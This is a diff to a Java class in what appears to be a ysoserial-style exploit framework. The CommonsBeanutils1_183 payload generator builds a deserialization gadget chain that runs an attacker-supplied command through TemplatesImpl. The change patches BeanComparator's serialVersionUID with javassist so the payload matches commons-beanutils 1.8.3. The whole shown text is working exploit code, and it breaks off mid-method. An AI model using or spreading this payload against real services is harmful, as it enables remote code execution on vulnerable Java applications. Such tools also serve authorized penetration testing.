@@ -1,8 +1,10 @@
 package me.gv7.woodpecker.yso.payloads;
 
+import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtField;
+import me.gv7.woodpecker.yso.JavassistClassLoader;
 import me.gv7.woodpecker.yso.payloads.annotation.Authors;
 import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
 import me.gv7.woodpecker.yso.payloads.util.Gadgets;
@@ -11,6 +13,7 @@ import me.gv7.woodpecker.yso.payloads.util.Reflections;
 import org.apache.commons.beanutils.BeanComparator;
 
 import java.math.BigInteger;
+import java.util.Comparator;
 import java.util.PriorityQueue;
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
@@ -21,11 +24,19 @@ public class CommonsBeanutils1_183 implements ObjectPayload<Object> {
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 
-        final CtClass value = ClassPool.getDefault().get("org.apache.commons.beanutils.BeanComparator");
-        value.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", value));
+        // 修改BeanComparator类的serialVersionUID
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
+        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
+        ctBeanComparator.defrost();
+        try {
+            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
+            ctBeanComparator.removeField(ctSUID);
+        }catch (javassist.NotFoundException e){}
+        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
 
-		// mock method name until armed
-        final BeanComparator comparator = (BeanComparator) value.toClass().newInstance();
+        // mock method name until armed
+        final Comparator comparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
         Reflections.setFieldValue(comparator, "property", "lowestSetBit");
 
 		// create queue with numbers and basic comparator
